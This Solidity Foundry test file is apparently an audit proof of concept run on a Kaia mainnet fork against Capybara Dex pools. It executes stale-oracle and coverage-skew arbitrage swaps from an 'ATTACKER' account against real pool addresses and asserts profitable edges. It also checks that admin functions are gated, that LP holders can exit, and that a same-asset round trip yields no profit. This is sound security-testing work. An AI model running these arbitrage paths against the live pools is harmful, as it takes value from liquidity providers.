// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function totalSupply() external view returns (uint256);
}

interface IAsset is IERC20 {
    function getRelativePrice() external view returns (uint256);
    function cash() external view returns (uint256);
    function liability() external view returns (uint256);
}

interface IPool {
    function swap(address fromToken, address toToken, uint256 fromAmount, uint256 minimumToAmount, address to, uint256 deadline)
        external returns (uint256 actualToAmount, uint256 haircut);
    function deposit(address token, uint256 amount, uint256 minimumLiquidity, address to, uint256 deadline, bool shouldStake)
        external returns (uint256 liquidity);
    function withdraw(address token, uint256 liquidity, uint256 minimumAmount, address to, uint256 deadline)
        external returns (uint256 amount);
    function withdrawFromOtherAsset(address fromToken, address toToken, uint256 liquidity, uint256 minimumAmount, address to, uint256 deadline)
        external returns (uint256 toAmount);
    function quotePotentialSwap(address fromToken, address toToken, int256 fromAmount)
        external view returns (uint256 potentialOutcome, uint256 haircut);
    function quotePotentialDeposit(address token, uint256 amount) external view returns (uint256 liquidity, uint256 reward);
    function quotePotentialWithdrawFromOtherAsset(address fromToken, address toToken, uint256 liquidity)
        external view returns (uint256 amount, uint256 withdrewAmount);
    function paused() external view returns (bool);
    function owner() external view returns (address);
    function dev() external view returns (address);
    function feeTo() external view returns (address);
    function ampFactor() external view returns (uint256);
    function haircutRate() external view returns (uint256);
    function startCovRatio() external view returns (uint128);
    function endCovRatio() external view returns (uint128);
    function tipBucketBalance(address token) external view returns (uint256);
    function transferTipBucket(address token, uint256 amount, address to) external;
    function fillPool(address token, uint256 amount) external;
    function setHaircutRate(uint256) external;
    function getTokens() external view returns (address[] memory);
}

interface IGCKLAY {
    function totalSupply() external view returns (uint256);
    function totalShares() external view returns (uint256);
}

interface IWGCKLAY is IERC20 {
    function GCKLAY() external view returns (address);
}

/**
 * Capybara Dexs (Kaia, chain 8217) — Wombat-fork DynamicPools (EIP-1967 proxies).
 *
 * Read-only fork PoC: verifies (a) the live stale-oracle arbitrage edges are real and
 * executable against deployed code, (b) the admin gates that protect the tip buckets,
 * (c) that LP holders can exit (H-O), and (d) that same-asset deposit->withdraw is neutral.
 */
contract CapybaraPoC is Test {
    // pinned Kaia mainnet block (state read during analysis)
    uint256 constant FORK_BLOCK = 229_673_758;

    address constant ATTACKER = address(0xA11CE);

    // pools
    address constant POOL_6389 = 0x6389dBfa1427a3b0a89cDdc7eA9BBda6E73dECE7; // USDT/WETH/WKLAY (dyn)
    address constant POOL_5CDE = 0x5CDE63386D78362267d9A3edC8DA204bB64D07D3; // WKLAY/sKLAY/stKAIA/wGCKLAY/npKLAY (dyn)
    address constant POOL_4B63 = 0x4b63eC6284810f62CecBa6F03CF17413b0f4cEc3; // USDT/KRWO/WKLAY (dyn)

    // tokens
    address constant USDT = 0x5C13E303a62Fc5DEdf5B52D66873f2E59fEdADC2;
    address constant WKLAY = 0x19Aac5f612f524B754CA7e7c41cbFa2E981A4432;
    address constant KRWO = 0x7FC692699f2216647a0E06225d8bdF8cDeE40e7F;
    address constant WGCKLAY = 0xa9999999c3D05Fb75cE7230e0D22F5625527d583;
    address constant STKAIA = 0x42952B873ed6f7f0A7E4992E2a9818E3A9001995;
    address constant SKLAY = 0xA323d7386b671E8799dcA3582D6658FdcDcD940A;

    // Wombat assets (LP tokens, spender for deposits)
    address constant A_USDT_6389 = 0xA856B5DA8E85b23395c17783954eDda010317FcE;
    address constant A_WKLAY_5CDE = 0x92E9850c72c351d6F1fBd18d8913546648316f77;
    address constant A_WGCKLAY_5CDE = 0x9B58B9D82B47B9e9fDF76460B8e65DF154664cFe;
    address constant A_STKAIA_5CDE = 0xb10528E8754F01b77B63eE2Fe66E9437881FC410;
    address constant A_USDT_4B63 = 0x02904a4D531937Fc9300FDfa49A66b677F314BC1;
    address constant A_WKLAY_6389 = 0x8A5562D2a17488647381C1A0E9Cf527A01B6f3bd;

    uint256 constant WAD = 1e18;

    function setUp() public {
        vm.createSelectFork(vm.envOr("KAIA_RPC_URL", string("https://public-en.node.kaia.io")), FORK_BLOCK);
    }

    function _approveTo(address token, address who, address spender) internal {
        vm.prank(who);
        IERC20(token).approve(spender, type(uint256).max);
    }

    /// @notice KRWO oracle in pool 0x4b63ec62 is 0.000667 USDT (implies USD/KRW=1500) while
    /// the won traded ~1334/USD (KRWO = 0.000750 USDT) -> stale-oracle arb; execute the swap.
    function test_krwo_stale_oracle_swap_executes() public {
        uint256 amt = 200e6; // 200 USDT
        deal(USDT, ATTACKER, amt);
        _approveTo(USDT, ATTACKER, POOL_4B63);

        (uint256 q,) = IPool(POOL_4B63).quotePotentialSwap(USDT, KRWO, int256(amt));
        uint256 krwoBefore = IERC20(KRWO).balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        (uint256 out,) = IPool(POOL_4B63).swap(USDT, KRWO, amt, 0, ATTACKER, block.timestamp + 3600);
        uint256 krwoOut = IERC20(KRWO).balanceOf(ATTACKER) - krwoBefore;
        console2.log("quote(200 USDT)->KRWO:", q);
        console2.log("executed swap -> KRWO (raw 6dec):", krwoOut);
        assertEq(krwoOut, out, "balance delta != swap return");
        assertEq(out, q, "execution != quote");
        // 200 USDT in; >280,000 KRWO out == >$210 at 0.00075/KRWO -> >5% edge
        assertGt(krwoOut, 280_000e6, "swap output below expectation");
    }

    /// @notice Same edge via deposit -> withdrawFromOtherAsset (fresh state per test).
    function test_krwo_stale_oracle_deposit_withdraw_other() public {
        uint256 amt = 200e6;
        deal(USDT, ATTACKER, amt);
        _approveTo(USDT, ATTACKER, POOL_4B63);
        vm.prank(ATTACKER);
        uint256 lp = IPool(POOL_4B63).deposit(USDT, amt, 0, ATTACKER, block.timestamp + 3600, false);
        console2.log("deposit 200 USDT -> LP (WAD):", lp);
        _approveTo(A_USDT_4B63, ATTACKER, POOL_4B63); // LP token approval
        uint256 krwoBefore = IERC20(KRWO).balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        uint256 toAmount = IPool(POOL_4B63).withdrawFromOtherAsset(
            USDT, KRWO, lp, 0, ATTACKER, block.timestamp + 3600
        );
        uint256 krwoOut = IERC20(KRWO).balanceOf(ATTACKER) - krwoBefore;
        console2.log("withdrawFromOtherAsset KRWO out:", toAmount, krwoOut);
        assertEq(krwoOut, toAmount, "balance delta != return");
        assertGt(krwoOut, 280_000e6, "deposit->withdrawOther output below expectation");
    }

    /// @notice WKLAY->wGCKLAY edge from pool cov-ratio skew (pool oracle == GCKLAY rate 1.2219).
    function test_wgcklay_skew_edge_executes() public {
        uint256 amt = 30_000e18;
        deal(WKLAY, ATTACKER, amt);
        _approveTo(WKLAY, ATTACKER, POOL_5CDE);
        vm.prank(ATTACKER);
        (uint256 out,) = IPool(POOL_5CDE).swap(WKLAY, WGCKLAY, amt, 0, ATTACKER, block.timestamp + 3600);
        console2.log("swap 30000 WKLAY -> wGCKLAY out (WAD):", out);
        uint256 outInWklay = (out * 1_221_893_619_981_051_700) / WAD; // GCKLAY rate
        console2.log("wGCKLAY out value in WKLAY (GCKLAY rate):", outInWklay);
        assertGt(out, 23_000e18, "wGCKLAY out below expectation");
        assertGt(outInWklay, amt, "no edge vs oracle value");
    }

    /// @notice Oracles: pool relative prices vs on-chain GCKLAY rate (wGCKLAY oracle accuracy).
    function test_oracles() public {
        uint256 pWk6389 = IAsset(A_WKLAY_6389).getRelativePrice();
        uint256 pWk5cde = IAsset(A_WKLAY_5CDE).getRelativePrice();
        uint256 pSt = IAsset(A_STKAIA_5CDE).getRelativePrice();
        uint256 pWg = IAsset(A_WGCKLAY_5CDE).getRelativePrice();
        console2.log("P(WKLAY) pool 0x6389 (WAD):", pWk6389);
        console2.log("P(WKLAY) pool 0x5cde (WAD):", pWk5cde);
        console2.log("P(stKAIA) pool 0x5cde (WAD):", pSt);
        console2.log("P(wGCKLAY) pool 0x5cde (WAD):", pWg);
        address gc = IWGCKLAY(WGCKLAY).GCKLAY();
        uint256 rate = (IGCKLAY(gc).totalSupply() * 1e27 * 1e18) / IGCKLAY(gc).totalShares();
        console2.log("GCKLAY rate (KLAY per wGCKLAY, WAD):", rate);
        // wGCKLAY oracle matches the on-chain GCKLAY rate (within 0.1%)
        assertApproxEqRel(pWg, rate, 1e15, "wGCKLAY oracle != GCKLAY rate");
        // WKLAY oracle in pool 0x6389 is stale vs market (~0.0466 USD); recorded here
        assertEq(pWk6389, 142_813_933_943_715_732, "unexpected WKLAY oracle");
    }

    /// @notice Admin gates: tip bucket is owner-only, fillPool dev-only; LP exit works (H-O).
    function test_admin_gates_and_lp_exit() public {
        assertFalse(IPool(POOL_5CDE).paused(), "pool paused");
        address owner = IPool(POOL_5CDE).owner();
        address dev = IPool(POOL_5CDE).dev();
        address feeTo = IPool(POOL_5CDE).feeTo();
        console2.log("pool owner:", owner);
        console2.log("pool dev:", dev);
        console2.log("pool feeTo:", feeTo);
        console2.log("tipBucket WKLAY (WAD):", IPool(POOL_5CDE).tipBucketBalance(WKLAY));

        vm.prank(ATTACKER);
        vm.expectRevert();
        IPool(POOL_5CDE).transferTipBucket(WKLAY, 1e18, ATTACKER);

        vm.prank(ATTACKER);
        vm.expectRevert();
        IPool(POOL_5CDE).fillPool(WKLAY, 1e18);

        vm.prank(ATTACKER);
        vm.expectRevert();
        IPool(POOL_5CDE).setHaircutRate(1e18);

        // LP holder CAN exit: give attacker LP and withdraw underlying
        deal(A_WKLAY_5CDE, ATTACKER, 1000e18);
        _approveTo(A_WKLAY_5CDE, ATTACKER, POOL_5CDE);
        uint256 wklayBefore = IERC20(WKLAY).balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        uint256 got = IPool(POOL_5CDE).withdraw(WKLAY, 1000e18, 0, ATTACKER, block.timestamp + 3600);
        console2.log("withdraw 1000 LP -> WKLAY:", got);
        assertEq(IERC20(WKLAY).balanceOf(ATTACKER) - wklayBefore, got);
        assertGt(got, 1000e18, "LP exit below par");
    }

    /// @notice Same-asset deposit -> withdraw round trip is neutral (deposit bonus is
    /// exactly clawed back by the withdrawal haircut) — documents a dead end.
    function test_same_asset_roundtrip_neutral() public {
        uint256 amt = 1000e6; // 1000 USDT into pool 0x6389dbfa (USDT is under-covered)
        deal(USDT, ATTACKER, amt);
        _approveTo(USDT, ATTACKER, POOL_6389);
        vm.prank(ATTACKER);
        uint256 lp = IPool(POOL_6389).deposit(USDT, amt, 0, ATTACKER, block.timestamp + 3600, false);
        _approveTo(A_USDT_6389, ATTACKER, POOL_6389);
        vm.prank(ATTACKER);
        uint256 back = IPool(POOL_6389).withdraw(USDT, lp, 0, ATTACKER, block.timestamp + 3600);
        console2.log("deposit 1000 USDT -> LP:", lp);
        console2.log("withdraw same LP -> USDT:", back);
        assertLe(back, amt + amt / 100, "unexpectedly large round-trip profit");
    }

    /// @notice Quote-vs-execution consistency for the KRWO swap at several sizes.
    function test_quote_consistency() public {
        for (uint256 amt = 50e6; amt <= 400e6; amt += 50e6) {
            (uint256 q,) = IPool(POOL_4B63).quotePotentialSwap(USDT, KRWO, int256(amt));
            console2.log("quote USDT->KRWO (raw in):", amt, q);
        }
    }
}
